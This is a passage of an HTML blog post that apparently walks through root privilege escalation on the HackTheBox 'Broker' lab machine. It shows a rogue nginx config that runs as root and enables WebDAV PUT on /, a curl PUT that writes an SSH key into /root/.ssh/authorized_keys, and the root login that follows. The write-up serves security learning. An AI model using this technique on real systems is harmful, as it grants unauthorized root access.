Matching Defaults entries <span class="k">for </span>activemq on broker:
    env_reset, mail_badpass,
    <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>/snap/bin,
    use_pty

User activemq may run the following commands on broker:
    <span class="o">(</span>ALL : ALL<span class="o">)</span> NOPASSWD: /usr/sbin/nginx
activemq@broker:~<span class="err">$</span>
</pre></table></code></div></div><p>I have to exploit the nginx service to gain access as root and for that I need to use the methedology of <strong><a href="https://darrenmartynie.wordpress.com/2021/10/25/zimbra-nginx-local-root-exploit/">Zimbra</a></strong> exploit .</p><blockquote class="prompt-info"><p>And with that similar method I am going to create another nginx configuration file and run it as root so that I will have some listening port open as nginx connection through root privileges and I will be able to access the listing of files as a root user through that port .</p></blockquote><div class="language-bash nolineno highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre>activemq@broker:~<span class="nv">$ </span>find / <span class="nt">-name</span> nginx.conf <span class="nt">-type</span> f 2&gt;/dev/null
find / <span class="nt">-name</span> nginx.conf <span class="nt">-type</span> f 2&gt;/dev/null
/etc/nginx/nginx.conf
activemq@broker:~<span class="nv">$ </span><span class="nb">cp</span> /etc/nginx/nginx.conf /dev/shm/nginx.conf
<span class="nb">cp</span> /etc/nginx/nginx.conf /dev/shm/nginx.conf
activemq@broker:~<span class="err">$</span>
</pre></table></code></div></div><p>Now I have another nginx.conf file that will be my working nginx configurations in it like this →</p><div class="language-bash nolineno highlighter-rouge" file="/dev/shm/nginx.conf"><div class="code-header"> <span data-label-text="/dev/shm/nginx.conf"><i class="far fa-file-code fa-fw"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
</pre><td class="rouge-code"><pre>user root<span class="p">;</span>

events <span class="o">{</span>
	worker_connections 778<span class="p">;</span>
<span class="o">}</span>
http <span class="o">{</span>
	server <span class="o">{</span>

		listen 4444<span class="p">;</span>
		root /<span class="p">;</span>
		autoindex on<span class="p">;</span>
		dav_methods PUT<span class="p">;</span>

	<span class="o">}</span>
<span class="o">}</span>
</pre></table></code></div></div><ul><li>The first line <strong><code class="language-plaintext highlighter-rouge">user root;</code></strong> specifies the user that runs the Nginx worker processes. <a href="https://www.digitalocean.com/community/tutorials/understanding-the-nginx-configuration-file-structure-and-configuration-contexts">In this case, it is the root user, which is not recommended for security reasons</a>.<li>The <strong><code class="language-plaintext highlighter-rouge">events</code></strong> block contains settings that affect how Nginx handles connections from clients. <a href="https://www.nginx.com/resources/wiki/start/topics/examples/full/">The <strong><code class="language-plaintext highlighter-rouge">worker_connections 778;</code></strong> directive sets the maximum number of simultaneous connections that each worker process can handle</a>.<li>The <strong><code class="language-plaintext highlighter-rouge">http</code></strong> block contains settings that apply to the HTTP protocol, such as compression, caching, logging, etc. <a href="https://www.ionos.com/digitalguide/server/configuration/nginx-tutorial-getting-started-with-nginxconf/">It also contains one or more <strong><code class="language-plaintext highlighter-rouge">server</code></strong> blocks, which define virtual servers that listen for requests on specific ports and serve content based on the request URI</a>.<li>The <strong><code class="language-plaintext highlighter-rouge">server</code></strong> block in this file has the following directives:<ul><li><strong><code class="language-plaintext highlighter-rouge">[listen 4444;</code></strong> tells Nginx to listen for HTTP requests on port 4444](https://medium.com/adrixus/beginners-guide-to-nginx-configuration-files-527fcd6d5efd).<li><strong><code class="language-plaintext highlighter-rouge">root /;</code></strong> sets the root directory for requests that do not match any other location. <a href="https://127.0.0.1:8080/">In this case, it is the root of the file system, which is also not recommended for security reasons</a>.<li><strong><code class="language-plaintext highlighter-rouge">autoindex on;</code></strong> enables directory listing for requests that end with a slash.<li><strong><code class="language-plaintext highlighter-rouge">dav_methods PUT;</code></strong> allows clients to upload files to the server using the HTTP PUT method.</ul></ul><div class="language-bash nolineno highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
</pre><td class="rouge-code"><pre>activemq@broker:~<span class="nv">$ </span>nano /dev/shm/nginx.conf
activemq@broker:~<span class="nv">$ </span><span class="nb">cat</span> /dev/shm/nginx.conf
user root<span class="p">;</span>

events <span class="o">{</span>
	worker_connections 778<span class="p">;</span>
<span class="o">}</span>
http <span class="o">{</span>
	server <span class="o">{</span>

		listen 4444<span class="p">;</span>
		root /<span class="p">;</span>
		autoindex on<span class="p">;</span>
		dav_methods PUT<span class="p">;</span>

	<span class="o">}</span>
<span class="o">}</span>

activemq@broker:~<span class="nv">$ </span><span class="nb">sudo </span>nginx <span class="nt">-c</span> /dev/shm/nginx.conf 
activemq@broker:~<span class="err">$</span>
</pre></table></code></div></div><p>Lets check the active network connections →</p><p><a href="/Vulnhub-Files/img/Broker/Untitled%203.png" class="popup img-link shimmer"><img src="/Vulnhub-Files/img/Broker/Untitled%203.png" alt="Untitled" loading="lazy"></a></p><p>Now lets curl the root directory and see if we can getback the index of root directory →</p><div class="language-bash nolineno highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
</pre><td class="rouge-code"><pre>activemq@broker:~<span class="nv">$ </span>curl http://localhost:4444/
&lt;html&gt;
&lt;<span class="nb">head</span><span class="o">&gt;</span>&lt;title&gt;Index of /&lt;/title&gt;&lt;/head&gt;
&lt;body&gt;
&lt;h1&gt;Index of /&lt;/h1&gt;&lt;hr&gt;&lt;pre&gt;&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">"../"</span><span class="o">&gt;</span>../&lt;/a&gt;
&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">"bin/"</span><span class="o">&gt;</span>bin/&lt;/a&gt;                                               06-Nov-2023 01:10                   -
&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">"boot/"</span><span class="o">&gt;</span>boot/&lt;/a&gt;                                              06-Nov-2023 01:38                   -
&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">"dev/"</span><span class="o">&gt;</span>dev/&lt;/a&gt;                                               05-Dec-2023 05:12                   -
&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">"etc/"</span><span class="o">&gt;</span>etc/&lt;/a&gt;                                               07-Nov-2023 06:53                   -
&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">"home/"</span><span class="o">&gt;</span>home/&lt;/a&gt;                                              06-Nov-2023 01:18                   -
&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">"lib/"</span><span class="o">&gt;</span>lib/&lt;/a&gt;                                               06-Nov-2023 00:57                   -
&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">"lib32/"</span><span class="o">&gt;</span>lib32/&lt;/a&gt;                                             17-Feb-2023 17:19                   -
&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">"lib64/"</span><span class="o">&gt;</span>lib64/&lt;/a&gt;                                             05-Nov-2023 02:36                   -
&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">"libx32/"</span><span class="o">&gt;</span>libx32/&lt;/a&gt;                                            17-Feb-2023 17:19                   -
&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">"lost%2Bfound/"</span><span class="o">&gt;</span>lost+found/&lt;/a&gt;                                        27-Apr-2023 15:40                   -
&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">"media/"</span><span class="o">&gt;</span>media/&lt;/a&gt;                                             06-Nov-2023 01:18                   -
&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">"mnt/"</span><span class="o">&gt;</span>mnt/&lt;/a&gt;                                               17-Feb-2023 17:19                   -
&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">"opt/"</span><span class="o">&gt;</span>opt/&lt;/a&gt;                                               06-Nov-2023 01:18                   -
&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">"proc/"</span><span class="o">&gt;</span>proc/&lt;/a&gt;                                              05-Dec-2023 05:12                   -
&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">"root/"</span><span class="o">&gt;</span>root/&lt;/a&gt;                                              07-Nov-2023 08:40                   -
&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">"run/"</span><span class="o">&gt;</span>run/&lt;/a&gt;                                               05-Dec-2023 15:49                   -
&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">"sbin/"</span><span class="o">&gt;</span>sbin/&lt;/a&gt;                                              06-Nov-2023 01:10                   -
&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">"srv/"</span><span class="o">&gt;</span>srv/&lt;/a&gt;                                               06-Nov-2023 01:18                   -
&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">"sys/"</span><span class="o">&gt;</span>sys/&lt;/a&gt;                                               05-Dec-2023 05:12                   -
&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">"tmp/"</span><span class="o">&gt;</span>tmp/&lt;/a&gt;                                               05-Dec-2023 16:40                   -
&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">"usr/"</span><span class="o">&gt;</span>usr/&lt;/a&gt;                                               17-Feb-2023 17:19                   -
&lt;a <span class="nv">href</span><span class="o">=</span><span class="s2">"var/"</span><span class="o">&gt;</span>var/&lt;/a&gt;                                               05-Nov-2023 01:43                   -
&lt;/pre&gt;&lt;hr&gt;&lt;/body&gt;
&lt;/html&gt;
activemq@broker:~<span class="err">$</span>
</pre></table></code></div></div><p>I can list all the root directories through curl command , But for the shell access I have to include some files in root directory so that I can have too accessed shell →</p><p>So here , I need to create the ssh keys for user active and include its public key into the authorized_keys of root directory →</p><div class="language-bash nolineno highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
</pre><td class="rouge-code"><pre>activemq@broker:~<span class="nv">$ </span>ssh-keygen
Generating public/private rsa key pair.
Enter file <span class="k">in </span>which to save the key <span class="o">(</span>/home/activemq/.ssh/id_rsa<span class="o">)</span>: 
Created directory <span class="s1">'/home/activemq/.ssh'</span><span class="nb">.</span>
Enter passphrase <span class="o">(</span>empty <span class="k">for </span>no passphrase<span class="o">)</span>: 
Enter same passphrase again: 
Your identification has been saved <span class="k">in</span> /home/activemq/.ssh/id_rsa
Your public key has been saved <span class="k">in</span> /home/activemq/.ssh/id_rsa.pub
The key fingerprint is:
SHA256:TJRFkyyDmwnJ09Lqo/SOhi3DVl3G4C/aHrRcH/xys5A activemq@broker
The key israndomart image is:
+---[RSA 3072]----+
|   <span class="nb">.</span> + ..<span class="o">=</span>+.     |
|    <span class="k">*</span>.+.+ o.     |
|    .<span class="o">=</span>o+.o       |
|    ..+<span class="k">*</span><span class="nb">.</span>        |
|   ...+.So       |
|  ..<span class="o">=</span>oo.. +      |
|.+.oo<span class="o">=</span><span class="nb">.</span>  E +     |
|+o+o...   + o    |
|.+..o.     <span class="nb">.</span>     |
+----[SHA256]-----+
activemq@broker:~<span class="nv">$ </span><span class="nb">cat</span> .ssh/id_rsa.pub 
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC6MyuBf04hSwdaOAuqjPI927NJd5GpSSE0zviwqLKynkZynHnEq2mg5DKzg3wTJEEG+Wci1+KG6k5dWb8QMb+sTFm
sDkriGAhKyBSRz8avSrpKaFZEkUELhQm4FeU6ai2fZRFsk0k41OglwySCCYDLjf9M55WrYzwzqb0nO+gpR41QEQ6r7JwjmFAlZ360BM697bm4n0wERK6AunVpA30PZW
V4fSiIZTu2aUBvD6fSu7GpJjyQSW10xhzwoZ4rJiCnw49oeKjswm2l5/lhc35cskt9+jJFc0mnLyy5aKxAcV2oyhtYUJEuSkZY+JIvURvzbvjdAZVadbJ11YUO4KZLq
lJbKdTSpUkFydGNzm97Rjw+Lw+gUcaeSnozXkWAB/uSdGIeY9Q2d2SNrcW98WQr8HFcPNxziyD+RmWuFyG7O9mcpg3p9fu6+Yb80NoeUijpVXbEtgKoQw7HlOPByz4M
<span class="nv">G5nCLBqwGzm5rAZAnkbNOzAcuUOyyhyPx7fPhpoFHoU</span><span class="o">=</span> activemq@broker
activemq@broker:~<span class="err">$</span>
</pre></table></code></div></div><p>Now lets include this public key into the root directory of authorized_keys →</p><div class="language-bash nolineno highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>activemq@broker:~<span class="nv">$ </span>curl <span class="nt">-X</span> PUT localhost:4444/root/.ssh/authorized_keys <span class="nt">-d</span> <span class="s1">'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDH8CvbWjICUQPx9sPrrAEKKfKzknXl4HouC2C0K3eSn/iSWrHBjyP9M9hZzNu80yvnjPcPwIbiPF7yrKzjuBgzEjUGxsgwkKaSG6sFiFPW/KIKDUTMCV6NeV0d9KvxQSlaXmDKQ2HNBKklegKzaQZVGh1kf4rz+dvkezN9hKFgz7gCDGOfiPPwJYpnd7fKRhmT48/B19rQenOxhduc5avIpJbe9CrV0waa3jjy54Fjeqcd4xg5MFSDvT9IlcNYtTOS0rMYVfnJHaJJW8W0E+v6XyjCmWzOangeiERCP5o3CKFN7WzFcfgXC7yt0CK4HuOHFhVu+yxfD0KpZitzqvjAP7ZA/lYj8O74uPsRUvWQM8M1vpelERuekAoQo4iFnZ2UzuTUCkPA9Yujn+It5LiKpGFy/dGl95cIr2Os7smF4L/a7M2wbKHGutqe/RQDKdD49QyJ0DabTx+QzyjeC5IhOTdDgBY1HpnZ/HuUgRpUMSkfRDuEc4GLGmCY5i/Suo0= activemq@broker'</span>
</pre></table></code></div></div><p>Let’s check through login it as root user →</p><div class="language-bash nolineno highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
</pre><td class="rouge-code"><pre>activemq@broker:~<span class="nv">$ </span><span class="nb">chmod </span>600 ~/.ssh/id_rsa
activemq@broker:~<span class="nv">$ </span>ssh <span class="nt">-i</span> ~/.ssh/id_rsa root@localhost
The authenticity of host <span class="s1">'localhost (127.0.0.1)'</span> can not be established.
ED25519 key fingerprint is SHA256:TgNhCKF6jUX7MG8TC01/MUj/+u0EBasUVsdSQMHdyfY.
This key is not known by any other names
Are you sure you want to <span class="k">continue </span>connecting <span class="o">(</span><span class="nb">yes</span>/no/[fingerprint]<span class="o">)</span>? <span class="nb">yes
</span>Warning: Permanently added <span class="s1">'localhost'</span> <span class="o">(</span>ED25519<span class="o">)</span> to the list of known hosts.
Welcome to Ubuntu 22.04.3 LTS <span class="o">(</span>GNU/Linux 5.15.0-88-generic x86_64<span class="o">)</span>
...
...
root@broker:~# <span class="nb">whoami
</span>root
root@broker:~# <span class="nb">id
</span><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
root@broker:~# <span class="nb">cd</span> /root
root@broker:~# <span class="nb">ls</span> <span class="nt">-al</span>
total 36
drwx------  5 root root 4096 Nov  7 08:40 <span class="nb">.</span>
drwxr-xr-x 18 root root 4096 Nov  6 01:18 ..
lrwxrwxrwx  1 root root    9 Apr 27  2023 .bash_history -&gt; /dev/null
<span class="nt">-rw-r--r--</span>  1 root root 3106 Oct 15  2021 .bashrc
drwx------  2 root root 4096 Apr 27  2023 .cache
<span class="nt">-rwxr-xr-x</span>  1 root root  517 Nov  7 08:15 cleanup.sh
drwxr-xr-x  3 root root 4096 Apr 27  2023 .local
<span class="nt">-rw-r--r--</span>  1 root root  161 Jul  9  2019 .profile
<span class="nt">-rw-r-----</span>  1 root root   33 Dec  7 09:29 root.txt
drwx------  2 root root 4096 Dec  7 09:38 .ssh
root@broker:~# <span class="nb">cat </span>root.txt
1d19bc37b08665582e06c84e83e69aac
root@broker:~# ip a
1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    <span class="nb">link</span>/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc mq state UP group default qlen 1000
    <span class="nb">link</span>/ether 00:50:56:b9:bd:5d brd ff:ff:ff:ff:ff:ff
    altname enp3s0
    altname ens160
    inet 10.10.11.243/23 brd 10.10.11.255 scope global eth0
       valid_lft forever preferred_lft forever
    inet6 dead:beef::250:56ff:feb9:bd5d/64 scope global dynamic mngtmpaddr 
       valid_lft 86395sec preferred_lft 14395sec
    inet6 fe80::250:56ff:feb9:bd5d/64 scope <span class="nb">link 
       </span>valid_lft forever preferred_lft forever
root@broker:~# <span class="nb">hostname
</span>broker
root@broker:~#
</pre></table></code></div></div><p>I am root now !!</p><blockquote class="prompt-tip"><p>If you have any questions or suggestions, please leave a comment below. Thank You !</p></blockquote></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw me-1"></i> <a href="/categories/hackthebox/">HackTheBox</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw me-1"></i> <a href="/tags/activemq/" class="post-tag no-text-decoration" >ActiveMQ</a> <a href="/tags/metasploit/" class="post-tag no-text-decoration" >Metasploit</a> <a href="/tags/nginx/" class="post-tag no-text-decoration" >Nginx</a> <a href="/tags/privesc/" class="post-tag no-text-decoration" >PrivEsc</a> <a href="/tags/public-exploit/" class="post-tag no-text-decoration" >Public Exploit</a></div><div class=" post-tail-bottom d-flex justify-content-between align-items-center mt-5 pb-2 " ><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper d-flex align-items-center"> <span class="share-label text-muted">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Broker%20-%20StrongShiv8&url=https%3A%2F%2Fstrongshiv8.github.io%2Fposts%2FBroker%2F" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Twitter" aria-label="Twitter"> <i class="fa-fw fa-brands fa-square-x-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Broker%20-%20StrongShiv8&u=https%3A%2F%2Fstrongshiv8.github.io%2Fposts%2FBroker%2F" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Facebook" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://t.me/share/url?url=https%3A%2F%2Fstrongshiv8.github.io%2Fposts%2FBroker%2F&text=Broker%20-%20StrongShiv8" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Telegram" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <a href="https://www.linkedin.com/feed/?shareActive=true&shareUrl=https%3A%2F%2Fstrongshiv8.github.io%2Fposts%2FBroker%2F" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Linkedin" aria-label="Linkedin"> <i class="fa-fw fab fa-linkedin"></i> </a> <button id="copy-link" aria-label="Copy link" class="btn small" data-bs-toggle="tooltip" data-bs-placement="top" title="Copy link" data-title-succeed="Link copied successfully!" > <i class="fa-fw fas fa-link pe-none fs-6"></i> </button> </span></div></div></div></article></main><aside aria-label="Panel" id="panel-wrapper" class="col-xl-3 ps-2 text-muted"><div class="access"><section id="access-lastmod"><h2 class="panel-heading">Recently Updated</h2><ul class="content list-unstyled ps-0 pb-1 ms-1 mt-2"><li class="text-truncate lh-lg"> <a href="/posts/Billing/">Billing</a><li class="text-truncate lh-lg"> <a href="/posts/Boxing/">Boxing</a><li class="text-truncate lh-lg"> <a href="/posts/Insomnia/">Insomnia</a><li class="text-truncate lh-lg"> <a href="/posts/Sea/">Sea</a><li class="text-truncate lh-lg"> <a href="/posts/Talk/">Talk</a></ul><div> <script src="https://tryhackme.com/badge/164383"></script></div><br><div> <a href="https://app.hackthebox.com/profile/595651"> <script src="https://www.hackthebox.eu/badge/595651"></script> </a></div></section><section><h2 class="panel-heading">Trending Tags</h2><div class="d-flex flex-wrap mt-3 mb-1 me-3"> <a class="post-tag btn btn-outline-primary" href="/tags/privesc/">PrivEsc</a> <a class="post-tag btn btn-outline-primary" href="/tags/public-exploit/">Public Exploit</a> <a class="post-tag btn btn-outline-primary" href="/tags/suids/">SUIDs</a> <a class="post-tag btn btn-outline-primary" href="/tags/cms/">CMS</a> <a class="post-tag btn btn-outline-primary" href="/tags/windows/">Windows</a> <a class="post-tag btn btn-outline-primary" href="/tags/password-bruteforce/">Password Bruteforce</a> <a class="post-tag btn btn-outline-primary" href="/tags/active-directory/">Active Directory</a> <a class="post-tag btn btn-outline-primary" href="/tags/lfi/">LFI</a> <a class="post-tag btn btn-outline-primary" href="/tags/wordpress/">Wordpress</a> <a class="post-tag btn btn-outline-primary" href="/tags/recon/">Recon</a></div></section></div><div class="toc-border-cover z-3"></div><section id="toc-wrapper" class="invisible position-sticky ps-0 pe-4 pb-4"><h2 class="panel-heading ps-3 pb-2 mb-0">Contents</h2><nav id="toc"></nav></section></aside></div><div class="row"><div id="tail-wrapper" class="col-12 col-lg-11 col-xl-9 px-md-4"><aside id="related-posts" aria-labelledby="related-label"><h3 class="mb-4" id="related-label">Further Reading</h3><nav class="row row-cols-1 row-cols-md-2 row-cols-xl-3 g-4 mb-4"><article class="col"> <a href="/posts/Hollywood/" class="post-preview card h-100"><div class="card-body"> <time data-ts="1696876200" data-df="ll" > Oct 10, 2023 </time><h4 class="pt-0 my-2">Hollywood</h4><div class="text-muted"><p>Description ⤵️ This is a Hollywood machine writeup/walkthrough, from PwnTillDawn platform -&amp;gt; https://online.pwntilldawn.com/ with is maintain through wizlynx group -&amp;gt; https://www.wizlynxgrou...</p></div></div></a></article><article class="col"> <a href="/posts/HA-HARDY/" class="post-preview card h-100"><div class="card-body"> <time data-ts="1686681000" data-df="ll" > Jun 14, 2023 </time><h4 class="pt-0 my-2">HA HARDY</h4><div class="text-muted"><p>Lets Check the IP address of the victim machine ⤵️ {: .nolineno} IP : 10.0.2.36 Port Scan Results ⤵️ ┌──(kali㉿kali)-[~/Downloads/Proving_Ground/ha_hardy] └─$ sudo nmap -sC -sV -p- -T4 -oN Nma...</p></div></div></a></article><article class="col"> <a href="/posts/EVM_1/" class="post-preview card h-100"><div class="card-body"> <time data-ts="1686421800" data-df="ll" > Jun 11, 2023 </time><h4 class="pt-0 my-2">EVM : 1</h4><div class="text-muted"><p>Description ⤵️ 💡 EVM_1 This is super friendly box intended for Beginner is This works better with VirtualBox rather than VMware Let’s find the IP Address first » IP : 10.0.2.13 Port S...</p></div></div></a></article></nav></aside><nav class="post-navigation d-flex justify-content-between" aria-label="Post Navigation"> <a href="/posts/Blogger/" class="btn btn-outline-primary" aria-label="Older" ><p>Blogger</p></a> <a href="/posts/Deception-1.1/" class="btn btn-outline-primary" aria-label="Newer" ><p>Deception : 1.1</p></a></nav><footer aria-label="Site Info" class=" d-flex flex-column justify-content-center text-muted flex-lg-row justify-content-lg-between align-items-lg-center pb-lg-3 " ><p>© <time>2025</time> <a href="https://twitter.com/StrongShiv8">Shivendra Prajapati</a>. <span data-bs-toggle="tooltip" data-bs-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author." >Some rights reserved.</span></p><p>Using the <a data-bs-toggle="tooltip" data-bs-placement="top" title="v7.3.0" href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener" >Chirpy</a> theme for <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a>.</p></footer></div></div><div id="search-result-wrapper" class="d-flex justify-content-center d-none"><div class="col-11 content"><div id="search-hints"><section><h2 class="panel-heading">Trending Tags</h2><div class="d-flex flex-wrap mt-3 mb-1 me-3"> <a class="post-tag btn btn-outline-primary" href="/tags/privesc/">PrivEsc</a> <a class="post-tag btn btn-outline-primary" href="/tags/public-exploit/">Public Exploit</a> <a class="post-tag btn btn-outline-primary" href="/tags/suids/">SUIDs</a> <a class="post-tag btn btn-outline-primary" href="/tags/cms/">CMS</a> <a class="post-tag btn btn-outline-primary" href="/tags/windows/">Windows</a> <a class="post-tag btn btn-outline-primary" href="/tags/password-bruteforce/">Password Bruteforce</a> <a class="post-tag btn btn-outline-primary" href="/tags/active-directory/">Active Directory</a> <a class="post-tag btn btn-outline-primary" href="/tags/lfi/">LFI</a> <a class="post-tag btn btn-outline-primary" href="/tags/wordpress/">Wordpress</a> <a class="post-tag btn btn-outline-primary" href="/tags/recon/">Recon</a></div></section></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><aside aria-label="Scroll to Top"> <button id="back-to-top" type="button" class="btn btn-lg btn-box-shadow"> <i class="fas fa-angle-up"></i> </button></aside></div><div id="mask" class="d-none position-fixed w-100 h-100 z-1"></div><aside id="notification" class="toast" role="alert" aria-live="assertive" aria-atomic="true" data-bs-animation="true" data-bs-autohide="false" ><div class="toast-header"> <button type="button" class="btn-close ms-auto" data-bs-dismiss="toast" aria-label="Close" ></button></div><div class="toast-body text-center pt-0"><p class="px-2 mb-3">A new version of content is available.</p><button type="button" class="btn btn-primary" aria-label="Update"> Update </button></div></aside><script> (function () { const themeMapper = Theme.getThemeMapper('light', 'dark_dimmed'); const initTheme = themeMapper[Theme.visualState]; let lang = 'en';if (lang.length > 2 && !lang.startsWith('zh')) { lang = lang.slice(0, 2); } let giscusAttributes = { src: 'https://giscus.app/client.js', 'data-repo': 'StrongShiv8/strongshiv8.github.io', 'data-repo-id': 'R_kgDOJuXAnw', 'data-category': 'Comments', 'data-category-id': 'DIC_kwDOJuXAn84CeVpt', 'data-mapping': 'pathname', 'data-strict' : '0', 'data-reactions-enabled': '1', 'data-emit-metadata': '0', 'data-theme': initTheme, 'data-input-position': 'bottom', 'data-lang': lang, 'data-loading': 'lazy', crossorigin: 'anonymous', async: '' }; let giscusNode = document.createElement('script'); Object.entries(giscusAttributes).forEach(([key, value]) => giscusNode.setAttribute(key, value) ); const $footer = document.querySelector('footer'); $footer.insertAdjacentElement("beforebegin", giscusNode); addEventListener('message', (event) => { if (event.source === window && event.data && event.data.id === Theme.ID) { const newTheme = themeMapper[Theme.visualState]; const message = { setConfig: { theme: newTheme } }; const giscus = document.getElementsByClassName('giscus-frame')[0].contentWindow; giscus.postMessage({ giscus: message }, 'https://giscus.app'); } }); })(); </script> <script> document.addEventListener('DOMContentLoaded', () => { SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<article class="px-1 px-sm-2 px-lg-4 px-xl-0"><header><h2><a href="{url}">{title}</a></h2><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div></header><p>{snippet}</p></article>', noResultsText: '<p class="mt-5">Oops! No results found.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="me-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); }); </script>
